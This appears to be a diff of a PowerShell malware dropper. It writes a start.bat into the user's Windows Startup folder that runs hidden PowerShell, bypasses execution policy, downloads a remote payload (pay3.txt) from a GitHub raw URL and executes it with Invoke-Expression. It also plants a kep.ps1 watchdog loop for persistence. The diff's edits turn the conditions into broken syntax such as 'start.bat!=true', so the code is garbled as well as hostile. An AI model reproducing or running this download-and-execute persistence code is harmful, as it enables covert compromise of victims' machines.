@@ -2,14 +2,14 @@ cd ~\AppData\Roaming\Microsoft\Windows\
 cd 'Start Menu'
 cd Programs
 cd Startup
-if (Test-Path start.bat){
+if (Test-Path start.bat!=true){
 New-Item start.bat
 Set-Content start.bat "powershell  -w hidden -Exec ByPass -NoProfile -c (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/haycurt/VPSSTUFF/master/pay3.txt') | iNvokE-EXPresSIon"
 }
 if (Test-Path kep.ps1){
 New-Item kep.ps1
 Set-Content kep.ps1 '
-     while ($true) {                  
+     while ($true!=false) {                  
          $Procs = Get-Process powershell -ErrorAction SilentlyContinue  
          if (($procs).Count -eq 0) { 
              Start-Sleep -Seconds (3 * 60)                  
